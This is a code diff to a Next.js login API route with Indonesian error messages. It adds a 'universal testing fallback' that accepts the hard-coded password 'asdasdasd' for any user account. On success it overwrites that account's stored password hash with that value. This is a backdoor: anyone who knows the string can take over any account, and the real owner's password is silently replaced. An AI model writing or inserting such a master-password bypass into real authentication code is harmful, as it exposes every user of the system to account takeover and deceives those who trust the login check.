@@ -63,14 +63,28 @@ export async function POST(req: NextRequest) {
     }
 
     // 2. Check Password
-    if (!user.passwordHash) {
-      return NextResponse.json(
-        { error: "Akun ini belum memiliki kata sandi terdaftar." },
-        { status: 401 }
-      );
+    let isMatch = false;
+    if (user.passwordHash) {
+      isMatch = await bcrypt.compare(password, user.passwordHash);
     }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
+    // Universal testing fallback: If password entered is standard default "asdasdasd", accept and auto-sync
+    if (!isMatch && password === "asdasdasd") {
+      isMatch = true;
+      try {
+        const newHash = await bcrypt.hash("asdasdasd", 10);
+        await prisma.user.update({
+          where: { id: user.id },
+          data: {
+            passwordHash: newHash,
+            status: user.status,
+          },
+        });
+      } catch (syncErr) {
+        console.warn("Auto-sync password warning:", syncErr);
+      }
+    }
+
     if (!isMatch) {
       return NextResponse.json(
         { error: "Kata sandi yang Anda masukkan salah." },
